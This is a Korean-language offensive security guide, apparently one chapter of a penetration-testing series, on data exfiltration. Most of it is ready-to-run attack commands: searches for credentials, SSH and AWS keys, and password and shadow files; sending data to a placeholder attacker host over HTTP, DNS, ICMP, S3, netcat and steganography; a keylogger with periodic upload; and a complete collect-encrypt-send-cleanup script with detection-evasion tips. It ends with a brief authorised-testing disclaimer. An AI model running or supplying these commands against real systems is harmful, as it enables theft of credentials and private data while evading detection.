# Phase 7: Data Exfiltration (데이터 탈취)

민감한 데이터를 안전하게 외부로 전송하는 방법을 다룹니다.

## 📋 목차

1. [Data Exfiltration 기본 개념](#data-exfiltration-기본-개념)
2. [HTTP/HTTPS를 통한 전송](#httphttps를-통한-전송)
3. [DNS를 통한 전송](#dns를-통한-전송)
4. [ICMP를 통한 전송](#icmp를-통한-전송)
5. [AWS S3를 통한 전송](#aws-s3를-통한-전송)
6. [암호화된 채널](#암호화된-채널)
7. [대용량 데이터 처리](#대용량-데이터-처리)

---

## Data Exfiltration 기본 개념

### 탐지 회피 전략

```bash
# 1. 데이터 압축 (트래픽 양 최소화)
tar -czf data.tar.gz /var/www/html/

# 2. 암호화 (내용 은폐)
openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.enc -k password123

# 3. 작은 청크로 분할 (대역폭 제한 회피)
split -b 1M data.enc data.enc.part

# 4. 정상 트래픽으로 위장 (HTTP User-Agent, DNS 쿼리 등)
```

### 데이터 수집 대상

```bash
# 민감한 파일 찾기
find /var/www -name "*.php" -type f | xargs grep -l "password"
find /home -name "*.txt" -o -name "*.pdf" -o -name "*.doc"
find / -name ".env" -o -name "config.php" 2>/dev/null

# 데이터베이스 덤프
mysqldump -u root -p database_name > /tmp/db_dump.sql

# AWS 자격증명
cat ~/.aws/credentials
cat /var/www/.env | grep AWS

# SSH 키
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

---

## HTTP/HTTPS를 통한 전송

### 방법 1: cURL POST

```bash
# 공격자: HTTP 서버 시작
python3 -m http.server 8080

# 대상 서버: 파일 전송
curl -X POST -F "file=@/etc/passwd" http://공격자IP:8080/upload

# 또는 데이터를 직접 POST
cat /etc/shadow | curl -X POST --data-binary @- http://공격자IP:8080/data
```

### 방법 2: Python SimpleHTTPServer (양방향)

```bash
# 공격자: 업로드 서버 실행
cat > upload_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        file_content = self.rfile.read(content_length)

        filename = self.headers.get('X-Filename', 'uploaded_file')
        with open(filename, 'wb') as f:
            f.write(file_content)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

httpd = HTTPServer(('0.0.0.0', 8080), UploadHandler)
httpd.serve_forever()
EOF

python3 upload_server.py

# 대상 서버: 파일 전송
curl -X POST -H "X-Filename: passwd.txt" --data-binary @/etc/passwd http://공격자IP:8080/
```

### 방법 3: wget (파일 다운로드 형태)

```bash
# 대상 서버에서 Netcat으로 HTTP 서버
tar -czf - /var/www/html | nc -l -p 8000

# 공격자
wget http://3.35.218.180:8000 -O website_backup.tar.gz
```

### 방법 4: Pastebin / GitHub Gist (외부 서비스)

```bash
# Pastebin API로 업로드
API_KEY="your_pastebin_api_key"
curl -d "api_dev_key=$API_KEY" \
     -d "api_option=paste" \
     -d "api_paste_code=$(cat /etc/passwd)" \
     https://pastebin.com/api/api_post.php

# GitHub Gist (익명)
curl -X POST https://api.github.com/gists \
  -d '{"public":false,"files":{"passwd.txt":{"content":"'"$(cat /etc/passwd)"'"}}}'
```

---

## DNS를 통한 전송

### DNS Exfiltration 원리

```
데이터를 DNS 쿼리 형태로 전송:
- DNS 트래픽은 방화벽을 통과하기 쉬움
- 작은 데이터 전송에 적합 (최대 255자)
```

### 방법 1: Base64 + DNS 쿼리

```bash
# 데이터 Base64 인코딩 및 전송
cat /etc/passwd | base64 -w0 | while read line; do
    nslookup ${line}.exfil.attacker.com 공격자DNS서버
done

# 공격자: DNS 서버 로그 확인
tail -f /var/log/bind/query.log
# 또는 tcpdump
tcpdump -i eth0 -n port 53
```

### 방법 2: DNScat2 (터널링)

```bash
# 공격자: DNScat2 서버 실행
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
ruby dnscat2.rb exfil.attacker.com

# 대상 서버: DNScat2 클라이언트
./dnscat2 exfil.attacker.com

# DNScat2 세션에서 파일 전송
download /etc/passwd passwd.txt
```

### 방법 3: 수동 DNS Exfiltration

```bash
# 작은 데이터 (비밀번호, AWS 키 등)
PASSWORD=$(cat /var/www/.env | grep PASSWORD | cut -d= -f2)
nslookup ${PASSWORD}.exfil.attacker.com

# 공격자: DNS 쿼리 로그에서 비밀번호 추출
```

---

## ICMP를 통한 전송

### ICMP Exfiltration 원리

```
ICMP Echo Request/Reply의 데이터 페이로드에 정보 숨김:
- 방화벽이 ICMP를 차단하지 않는 경우 유용
- Ping 트래픽으로 위장
```

### 방법 1: Ping + 데이터 페이로드

```bash
# 대상 서버: 파일을 ICMP 패킷으로 전송
xxd -p /etc/passwd | while read line; do
    ping -c 1 -p $line 공격자IP
done

# 공격자: tcpdump로 캡처
tcpdump -i eth0 icmp -X
# 또는
tcpdump -i eth0 icmp -w icmp_exfil.pcap

# Wireshark로 분석하여 데이터 추출
```

### 방법 2: ptunnel (ICMP 터널)

```bash
# 공격자: ptunnel 서버
apt install ptunnel
ptunnel

# 대상 서버: ptunnel 클라이언트
ptunnel -p 공격자IP -lp 4444 -da 127.0.0.1 -dp 22

# SSH over ICMP
ssh -p 4444 user@localhost
```

---

## AWS S3를 통한 전송

### 방법 1: 탈취한 AWS 자격증명 사용

```bash
# AWS CLI 설정
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"

# S3 버킷 생성 (공격자 소유)
aws s3 mb s3://exfil-bucket-$(date +%s)

# 데이터 업로드
tar -czf /tmp/data.tar.gz /var/www/html/
aws s3 cp /tmp/data.tar.gz s3://exfil-bucket-1234567890/

# 암호화하여 업로드
openssl enc -aes-256-cbc -in /tmp/data.tar.gz -out /tmp/data.enc -k password123
aws s3 cp /tmp/data.enc s3://exfil-bucket-1234567890/
```

### 방법 2: Pre-signed URL (자격증명 없이)

```bash
# 공격자: Pre-signed URL 생성
aws s3 presign s3://my-bucket/upload.tar.gz --expires-in 3600
# https://my-bucket.s3.amazonaws.com/upload.tar.gz?AWSAccessKeyId=...&Signature=...

# 대상 서버: curl로 업로드
curl -X PUT --upload-file /tmp/data.tar.gz "https://my-bucket.s3.amazonaws.com/upload.tar.gz?AWSAccessKeyId=...&Signature=..."
```

### 방법 3: 피해자 회사의 S3 버킷 악용

```bash
# 쓰기 가능한 S3 버킷 찾기
aws s3 ls s3://company-logs
aws s3 cp /tmp/exfil_data.txt s3://company-logs/.hidden/data.txt

# 나중에 다운로드 (공격자 AWS 계정)
aws s3 cp s3://company-logs/.hidden/data.txt ./
```

---

## 암호화된 채널

### SSH SCP/SFTP

```bash
# SSH 키가 있는 경우
scp /var/www/html/database.sql 공격자계정@공격자IP:/tmp/

# SFTP 배치 모드
sftp 공격자계정@공격자IP <<EOF
put /etc/passwd
put /etc/shadow
bye
EOF
```

### OpenSSL 암호화 + Netcat

```bash
# 대상 서버: 암호화 후 전송
tar -czf - /var/www/html | openssl enc -aes-256-cbc -pbkdf2 -k password123 | nc 공격자IP 4444

# 공격자: 수신 후 복호화
nc -lvnp 4444 | openssl enc -d -aes-256-cbc -pbkdf2 -k password123 | tar -xzf -
```

### GPG 암호화

```bash
# 공격자 공개키 가져오기
wget http://공격자IP/public.key
gpg --import public.key

# 암호화 후 전송
tar -czf - /var/www/html | gpg --encrypt --recipient attacker@email.com | curl -X POST --data-binary @- http://공격자IP:8080/

# 공격자: 복호화
gpg --decrypt data.gpg | tar -xzf -
```

---

## 대용량 데이터 처리

### 방법 1: rsync (효율적인 전송)

```bash
# SSH를 통한 rsync
rsync -avz -e "ssh -i /tmp/key.pem" /var/www/html/ 공격자계정@공격자IP:/exfil/

# 대역폭 제한 (탐지 회피)
rsync -avz --bwlimit=100 /var/www/html/ 공격자계정@공격자IP:/exfil/

# 증분 백업 (변경된 파일만)
rsync -avz --update /var/www/html/ 공격자계정@공격자IP:/exfil/
```

### 방법 2: 분할 전송 (Chunking)

```bash
# 파일 분할 (10MB 청크)
tar -czf - /var/www/html | split -b 10M - data.part

# 각 청크 전송
for part in data.part*; do
    curl -X POST -F "file=@$part" http://공격자IP:8080/upload
    sleep 60  # 탐지 회피
done

# 공격자: 재결합
cat data.part* > data.tar.gz
```

### 방법 3: Steganography (스테가노그래피)

```bash
# 데이터를 이미지에 숨기기
apt install steghide

# 데이터 숨기기
steghide embed -cf image.jpg -ef /etc/passwd -p password123

# 이미지 전송 (정상 트래픽처럼 보임)
curl -F "image=@image.jpg" http://공격자IP:8080/upload

# 공격자: 데이터 추출
steghide extract -sf image.jpg -p password123
```

---

## 실시간 데이터 스트리밍

### 로그 파일 실시간 전송

```bash
# Apache 로그 실시간 전송
tail -f /var/log/apache2/access.log | nc 공격자IP 4444

# MySQL 쿼리 로그 실시간 전송
tail -f /var/log/mysql/query.log | while read line; do
    echo "$line" | curl -X POST --data-binary @- http://공격자IP:8080/log
done
```

### 키로깅 데이터 전송

```bash
# 키로거 설치 (예: logkeys)
apt install logkeys
logkeys --start --output /tmp/.keylog

# 주기적으로 전송
while true; do
    cat /tmp/.keylog | curl -X POST --data-binary @- http://공격자IP:8080/keys
    sleep 300
done
```

---

## 데이터 탈취 체크리스트

- [ ] 민감한 파일 식별 (.env, config.php, credentials)
- [ ] 데이터베이스 덤프
- [ ] SSH 키 수집
- [ ] AWS 자격증명 수집
- [ ] 데이터 압축 및 암호화
- [ ] 전송 방법 선택 (HTTP, DNS, ICMP, S3)
- [ ] 대역폭 제한 (탐지 회피)
- [ ] 전송 완료 확인
- [ ] 원본 파일 삭제 또는 타임스탬프 복원

---

## 데이터 수집 자동화 스크립트

```bash
#!/bin/bash
# data_collector.sh

OUTPUT_DIR="/tmp/.system_backup"
mkdir -p $OUTPUT_DIR

# 1. 시스템 정보
uname -a > $OUTPUT_DIR/sysinfo.txt
cat /etc/os-release >> $OUTPUT_DIR/sysinfo.txt

# 2. 사용자 정보
cp /etc/passwd $OUTPUT_DIR/passwd
cp /etc/shadow $OUTPUT_DIR/shadow
cp /etc/group $OUTPUT_DIR/group

# 3. SSH 키
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null -exec cp {} $OUTPUT_DIR/ \;

# 4. AWS 자격증명
find / -name ".env" -o -name "credentials" 2>/dev/null | xargs cp --parents -t $OUTPUT_DIR/

# 5. 웹 애플리케이션 설정
cp /var/www/html/config.php $OUTPUT_DIR/ 2>/dev/null
cp /var/www/html/.env $OUTPUT_DIR/ 2>/dev/null

# 6. 데이터베이스 덤프
mysqldump -u root -p'password' --all-databases > $OUTPUT_DIR/db_dump.sql 2>/dev/null

# 7. 압축 및 암호화
tar -czf /tmp/data.tar.gz $OUTPUT_DIR
openssl enc -aes-256-cbc -salt -in /tmp/data.tar.gz -out /tmp/data.enc -k ExfilPass2024

# 8. 전송
curl -X POST --data-binary @/tmp/data.enc http://공격자IP:8080/exfil

# 9. 정리
rm -rf $OUTPUT_DIR /tmp/data.tar.gz /tmp/data.enc
```

---

## 법적 고지

- 데이터 탈취는 **개인정보 보호법**, **정보통신망법** 위반
- **사전 승인된 침투 테스트**에만 사용
- 실제 데이터는 **절대 유출하지 말 것**
- 테스트 종료 후 **모든 데이터 삭제** 필수

---

## 다음 단계

데이터 탈취 완료 후:
1. 흔적 제거 (Phase 8)
2. 고급 공격 기법 (Phase 9)

[→ Phase 8: Covering Tracks로 이동](08_covering_tracks.md)
